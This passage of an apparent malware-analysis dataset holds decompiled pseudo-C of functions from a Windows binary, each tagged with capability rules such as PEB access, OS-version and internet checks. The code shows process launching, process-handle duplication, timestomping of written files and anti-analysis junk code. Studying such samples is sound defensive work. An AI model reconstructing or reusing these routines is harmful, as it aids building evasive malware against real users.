        "decompiled_code": "\nvoid fcn.00404df0(void)\n\n{\n    uint16_t uVar1;\n    ushort extraout_CX;\n    ushort extraout_DX;\n    unkbyte3 unaff_EBX;\n    uchar *unaff_ESI;\n    uint32_t uVar2;\n    uint16_t unaff_DI;\n    bool bVar3;\n    bool bVar4;\n    uchar *puVar5;\n    \n    fcn.00401000(0x411550, 0xd, 0x40738c, 0x20);\n    fcn.00401000(0x411550, 0xd, 0x4073ac, 0x26);\n    bVar3 = false;\n    bVar4 = (CONCAT11(extraout_CX >> 8 & unaff_EBX >> 8, extraout_CX | unaff_EBX) & unaff_DI) == 0;\n    puVar5 = 0x411550;\n    fcn.00401000(0x411550, 0xd, 0x4073d4, 8);\n    if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n        unaff_ESI = puVar5;\n    }\n    fcn.00401000(0x411550, 0xd, 0x4073dc, 0x19);\n    fcn.00401000(0x411550, 0xd, 0x4073f8, 0xb);\n    fcn.00401000(0x411550, 0xd, 0x407404, 0x12);\n    fcn.00401000(0x411550, 0xd, 0x407418, 0x12);\n    fcn.00401000(0x411550, 0xd, 0x40742c, 2);\n    fcn.00401000(0x411550, 0xd, 0x407430, 8);\n    uVar2 = unaff_ESI & 0xffff0000 | unaff_ESI + 1;\n    bVar3 = uVar2 < 0x222c;\n    bVar4 = uVar2 == 0x222c;\n    fcn.00401000(0x411550, 0xd, 0x407438, 8);\n    if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00401000(0x411550, 0xd, 0x407440, 6);\n    fcn.00401000(0x411550, 0xd, 0x407448, 7);\n    fcn.00401000(0x411550, 0xd, 0x407450, 7);\n    uVar1 = fcn.00401000(0x411550, 0xd, 0x407458, 6);\n    bVar3 = ((uVar1 & 0xff | ((uVar1 >> 8) - unaff_EBX) + 0x4d << 8) & 0x26ae) == 1;\n    fcn.00401000(0x411550, 0xd, 0x407460, 0x25);\n    if ((!bVar3) && (bVar3)) {\n        out(*unaff_ESI, extraout_DX);\n    }\n    fcn.00401000(0x411550, 0xd, 0x407488, 8);\n    return;\n}\n",
        "token_count": 804
    },
    "004017f0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401852) overlaps instruction at (ram,0x00401851)\n// \n// WARNING: Removing unreachable block (ram,0x00401852)\n\nbool fcn.004017f0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    pcbData = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x407460, 0x407488, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    bVar4 = puVar1 == NULL;\n    if (bVar4) {\n        return false;\n    }\n    if ((!bVar4) && (bVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 420
    },
    "00401fe0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004020db) overlaps instruction at (ram,0x004020da)\n// \n// WARNING: Removing unreachable block (ram,0x0040209c)\n// WARNING: Removing unreachable block (ram,0x004020a8)\n// WARNING: Removing unreachable block (ram,0x004020db)\n// WARNING: Removing unreachable block (ram,0x004020b1)\n// WARNING: Removing unreachable block (ram,0x004020b3)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401fe0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint *puVar6;\n    uchar uVar7;\n    uint8_t uVar8;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar9;\n    float10 extraout_ST0;\n    uchar var_260h;\n    uint var_25fh;\n    uchar lpCommandLine;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    bVar9 = false;\n    if ((!SBORROW4(&stack0xfffffffc, 0x260)) && (SBORROW4(&stack0xfffffffc, 0x260))) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00404df0();\n    iVar4 = fcn.004017f0();\n    if (iVar4 != 0) {\n        var_260h = 0;\n        puVar6 = &var_25fh;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &var_260h, 0x26, 0);\n        if (iVar4 != 0) {\n            fcn.00403720();\n            lpCommandLine = 0;\n            puVar6 = &var_15bh;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&lpCommandLine, 0x4073ac, &var_260h, 0x40738c, 3);\n            var_14h = 0;\n            pcVar5 = _sym.imp.KERNEL32.dll_Sleep;\n            do {\n                puVar6 = &var_58h;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + bVar9 * -2 + 1;\n                }\n                hProcess = 0;\n                var_58h = 0x44;\n                var_ch = 0;\n                var_2ch = 1;\n                lParam = 0;\n                var_28h._0_2_ = 0;\n                var_4h = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                                  (0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n                if (iVar4 == 0) {\n                    return;\n                }\n                if ((-1 < iVar4) && (-1 >= iVar4)) {\n                    *(puVar6 + bVar9 * -2 + 7) = extraout_ST0;\n                    pcVar5 = pcVar5 + bVar9 * -2 + bVar9 * -8 + 5;\n                }\n                (*pcVar5)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.00401ef0, lParam);\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                uVar8 = iVar4 + -0x102 < 0;\n                uVar7 = iVar4 == 0x102;\n                if (uVar7) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if ((!uVar7) && (uVar7)) {\n                    uVar1 = bVar9 * 0x400 | (in_IF & 1) * 0x200;\n                    uVar2 = uVar1 | (in_TF & 1) * 0x100;\n                    bVar9 = (uVar1 & 0x400) != 0;\n                    in_IF = (uVar2 & 0x200) != 0;\n                    in_TF = ((uVar2 | (uVar8 & 1) * 0x80) & 0x100) != 0;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar3)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1289
    },
    "00402210": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402210(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004010b0(0x407010);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "004024c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004026f8) overlaps instruction at (ram,0x004026f4)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.004024c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    unkbyte10 extraout_ST0;\n    ulong uVar10;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar7 = &stack0xfffffffc;\n    puVar8 = &var_213h;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    s = 0;\n    puVar8 = &var_10fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    var_ch = 1;\n    *(puVar8 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x30);\n    fcn.00401740(&var_4h, &var_8h);\n    iVar5 = fcn.004010f0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar5 == 0) {\n        return 0;\n    }\n    iVar5 = fcn.00402970(&s, var_4h, var_8h);\n    bVar9 = iVar5 == 0;\n    if (bVar9) {\n        return 0;\n    }\n    if ((!bVar9) && (bVar9)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00401380();\n    iVar5 = fcn.00403270(0x407068);\n    if ((iVar5 != -1) || (iVar5 = fcn.00403270(0x40705c),  iVar5 != -1)) {\n        iVar5 = fcn.00403c60(arg_8h);\n        if (iVar5 != 0) {\n            fcn.00402c80();\n            fcn.004034b0();\n            return 1;\n        }\n        if (*0x425578 == 0) {\n            return 0;\n        }\n    }\n    uVar10 = fcn.00403070(arg_8h, &s);\n    piVar6 = uVar10 >> 0x20;\n    uVar4 = var_ch;\n    if (uVar10 == 0) {\n        uVar4 = 0;\n    }\n    *(uVar10 + -0x7ce92414) = extraout_ST0;\n    *piVar6 = *piVar6 + -0x97a207c;\n    if ((*piVar6 != 0) && (uVar3 = fcn.00403770(arg_8h),  uVar3 == 0)) {\n        var_ch = 0;\n        uVar4 = uVar3;\n    }\n    if (uVar4 == 0) {\n        uVar4 = fcn.00403ca0(arg_8h, 0);\n        var_ch = uVar4;\n    }\n    puVar2 = uVar4;\n    if (uVar4 != 0) {\n        fcn.004034b0();\n        puVar2 = &stack0xfffffdd0;\n    }\n    bVar9 = (POPCOUNT(puVar2 & 0xff) & 1U) != 0;\n    if ((bVar9) && (!bVar9)) {\n        puVar8 = &stack0xfffffdcc;\n        cVar1 = '\\x1e';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar7;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar4 = in(0x78);\n        return uVar4;\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x40707c, 0);\n    return uVar4;\n}\n",
        "token_count": 1150
    },
    "00402860": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nunkbyte6 __cdecl fcn.00402860(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 74
    },
    "004028a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402951) overlaps instruction at (ram,0x0040294f)\n// \n// WARNING: Removing unreachable block (ram,0x00402918)\n\nuint fcn.004028a0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char unaff_BL;\n    int32_t unaff_EDI;\n    \n    iVar1 = fcn.00403270(0x40707c);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar1 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar2 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n        if (iVar2 != 0) {\n            if ((iVar2 < 0) || (iVar2 >= 0)) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n                unaff_EDI = 0x402958;\n            }\n            *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e) + unaff_BL;\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 282
    },
    "00402970": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a08) overlaps instruction at (ram,0x00402a04)\n// \n// WARNING: Control flow encountered bad instruction data\n\nuint32_t * __cdecl fcn.00402970(uint arg_8h, uint32_t arg_ch, uint32_t *arg_10h)\n\n{\n    char *pcVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    char cVar7;\n    uchar *in_ECX;\n    uchar *extraout_ECX;\n    uint *extraout_ECX_00;\n    uint *puVar6;\n    uint uVar8;\n    uint32_t *puVar9;\n    uint32_t unaff_EBX;\n    uint32_t **unaff_ESI;\n    uchar *unaff_EDI;\n    uchar *puVar10;\n    ushort in_SS;\n    uchar in_CF;\n    bool in_PF;\n    uint8_t in_AF;\n    uchar in_ZF;\n    uchar in_SF;\n    uchar in_OF;\n    unkbyte10 extraout_ST0;\n    ulong uVar11;\n    uint32_t **ppuVar12;\n    uint var_4h;\n    \n    ppuVar12 = unaff_ESI;\n    if ((in_PF) || (!in_PF)) {\ncode_r0x0040299a:\n        uVar11 = fcn.00402ab0();\n        uVar8 = uVar11 >> 0x20;\n        *0x425578 = uVar11;\n        in_ECX = extraout_ECX;\n        if ((!in_OF) && (in_OF)) {\n            puVar10 = unaff_EDI + 1;\n            uVar2 = in(uVar11 >> 0x20);\n            *unaff_EDI = uVar2;\n            unaff_EBX = CONCAT31(unaff_EBX >> 8, 0xbc);\n            goto code_r0x004029bb;\n        }\n    }\n    else {\n        segment(in_SS, *0x10 + -0x10);\n        uVar8 = 0xb7bc9ea5;\n        puVar10 = unaff_EDI;\n        if (!in_CF) {\n            if (in_PF) {\n                (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n                iVar5 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n                if (iVar5 == 0) {\n                    return NULL;\n                }\n                if ((iVar5 < 0) || (iVar5 >= 0)) {\n                    unaff_EDI = 0x402958;\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                }\n                unaff_EDI[0x5e] = unaff_EDI[0x5e] + unaff_EBX;\n                return 0x1;\n            }\n            in_CF = 0;\n            in_OF = 0;\n            in_SF = &stack0xfffffff4 < 0;\n            in_ZF = *0x10 == 0xc;\n            ppuVar12 = 0xb7bc9ea5;\n            goto code_r0x0040299a;\n        }\ncode_r0x004029bb:\n        uVar11 = CONCAT44(uVar8, *0x425578);\n        if (!in_CF && !in_ZF) {\n            if (in_ECX != 0x1 && in_ZF != false) {\n                uVar2 = in(uVar8);\n                *puVar10 = uVar2;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if (in_SF) {\n                return 0x1;\n            }\n            goto code_r0x00402a3d;\n        }\n    }\n    *0x425578 = uVar11;\n    uVar2 = *in_ECX;\n    cVar7 = in_ECX >> 8;\n    *0x6a08450b = *0x6a08450b + cVar7;\n    *0x6a08458b = *0x6a08458b + -0x75;\n    pcVar1 = (uVar11 >> 0x20) + 2;\n    *pcVar1 = *pcVar1 + cVar7;\n    uVar11 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x6a08458b);\n    puVar9 = uVar11 >> 0x20;\n    unaff_ESI = uVar11;\n    if (unaff_ESI == 0xffffffff) {\n        return NULL;\n    }\n    if ((unaff_ESI < -1) || (-2 < unaff_ESI)) {\n        puVar6 = &fcn.00402970::var_4h;\n        puVar9 = arg_10h;\n    }\n    else {\n        *(unaff_ESI + -0x1f3a4905) = extraout_ST0;\n        uVar4 = unaff_ESI - 1U;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        uVar4 = uVar4 + in_AF * '\\x06';\n        arg_ch = unaff_ESI - 1U & 0xffffff00 |\n                 uVar4 + (0x90 < (uVar4 & 0xf0) | unaff_ESI != 0xffffffff | in_AF * (0xf9 < uVar4)) * '`';\n        uVar3 = *puVar9;\n        *puVar9 = *puVar9 + 0x558bdf84;\n        pcVar1 = (unaff_EBX & 0xffff0000 | CONCAT11(uVar2, unaff_EBX)) + 0x4d8d0c45;\n        *pcVar1 = *pcVar1 + extraout_ECX_00 + (0xaa74207b < uVar3);\n        puVar6 = extraout_ECX_00;\n    }\n    iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(unaff_ESI, arg_ch, puVar9, puVar6, 0);\n    if (iVar5 == 0) {\n        return NULL;\n    }\ncode_r0x00402a3d:\n    if (*0x425578 != 0) {\n        iVar5 = fcn.004028a0();\n        *0x425578 = iVar5 == 0;\n    }\n    fcn.00403ae0(0, unaff_ESI);\n    if ((!SCARRY4(&stack0xffffffe8, 8)) && (SCARRY4(&stack0xffffffe8, 8))) {\n        *ppuVar12 = arg_10h;\n        return arg_10h;\n    }\n    if (*0x425578 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    return 0x1;\n}\n",
        "token_count": 1500
    },
    "00402ec0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f7f) overlaps instruction at (ram,0x00402f7d)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00402ec0(void)\n\n{\n    int32_t *piVar1;\n    char cVar4;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    char *pcVar5;\n    uint *puVar6;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    ulong uVar9;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    uint uStack8;\n    \n    puVar7 = &stack0xfffffffc;\n    bVar8 = (POPCOUNT(&var_80h & 0xff) & 1U) != 0;\n    if ((bVar8) && (!bVar8)) {\n        puVar6 = &stack0xffffff74;\n        cVar4 = '\\x1e';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar7;\n            cVar4 = cVar4 + -1;\n        } while ('\\0' < cVar4);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    iVar3 = fcn.00401430();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    fcn.004043c0();\n    iVar3 = fcn.00403270(0x407074);\n    if (iVar3 == -1) {\n        fcn.00404a70();\n        *0x42557c = 1;\n        uVar9 = fcn.00402210();\n        pcVar5 = uVar9 >> 0x20;\n        uVar2 = uVar9;\n        bVar8 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n        if (uVar2 != 0) {\n            return 0;\n        }\n        if ((bVar8) || (!bVar8)) {\n            in_AF = 0;\n            pcVar5 = pcVar5 & 0xffffff00;\n            iVar3 = 7;\n        }\n        else {\n            out(*unaff_ESI, uVar9 >> 0x20);\n            do {\n                cVar4 = uVar2 >> 8;\n                in_AF = 9 < (uVar2 & 0xf) | in_AF;\n                uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar4 - in_AF), -in_AF);\n                iVar3 = extraout_ECX;\n            } while (in_AF || cVar4 == *pcVar5);\n        }\n        piVar1 = unaff_EDI + pcVar5 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(iVar3 + 0x32) = uVar2;\n        *(iVar3 + 7) = *(iVar3 + 7) >> (iVar3 & 0x1f);\n        var_80h._0_1_ = SUB41(pcVar5, 0);\n        puVar7 = &var_1fh;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        *(puVar7 + 2) = 0;\n        puVar7 = &var_80h + 1;\n        var_60h._0_1_ = var_80h;\n        var_20h = var_80h;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        *(puVar7 + 2) = 0;\n        puVar7 = &var_60h + 1;\n        var_40h._0_1_ = var_80h;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        *(puVar7 + 2) = 0;\n        puVar7 = &var_40h + 1;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        *(puVar7 + 2) = 0;\n        iVar3 = fcn.00403350(&var_80h, &var_60h, &var_20h, &var_40h);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.004037e0(&var_20h);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.004024c0(&var_80h, &var_60h, &var_20h, &var_40h);\n        return iVar3 != 0;\n    }\n    return 0;\n}\n",
        "token_count": 1272
    },
    "00403270": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403270(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0xffffffff;\n    iVar1 = (**0x4255a4)();\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar3 = &var_12ch;\n    var_4h = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x4255a8)();\n    do {\n        if (iVar2 == 0) {\ncode_r0x0040333c:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_8h;\n        }\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h);\n        if (iVar1 == 0) {\n            var_8h = var_128h;\n            iVar1 = var_4h;\n            goto code_r0x0040333c;\n        }\n        iVar2 = (**0x4255ac)(var_4h, &var_130h);\n        iVar1 = var_4h;\n    } while( true );\n}\n",
        "token_count": 386
    },
    "00403ae0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ae0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x407048;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(*0x10 + -0x130, 0, 0xd4);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.004010b0(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1151
    },
    "00403e90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f58) overlaps instruction at (ram,0x00403f56)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl\nfcn.00403e90(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uchar *arg_20h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    unkbyte6 Var7;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = arg_20h;\n    fcn.00403600(arg_18h, arg_1ch, arg_8h, 0x20, cVar1 + ' ');\n    bVar6 = false;\n    uVar2 = fcn.00403600(arg_18h, arg_1ch, arg_ch, 0x20, cVar1 + '`');\n    if ((!bVar6) && (bVar6)) {\n        out(0xbd, uVar2);\n        return uVar2;\n    }\n    fcn.00403600(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    iVar3 = fcn.00403600(arg_18h, arg_1ch, arg_14h, 0x20, cVar1 + -0x20);\n    if ((&stack0xfffffee5 < 0) || (&stack0xfffffee5 >= 0)) {\n        iVar3 = func_0x00403e40();\n        if (iVar3 == -1) {\n            iVar3 = 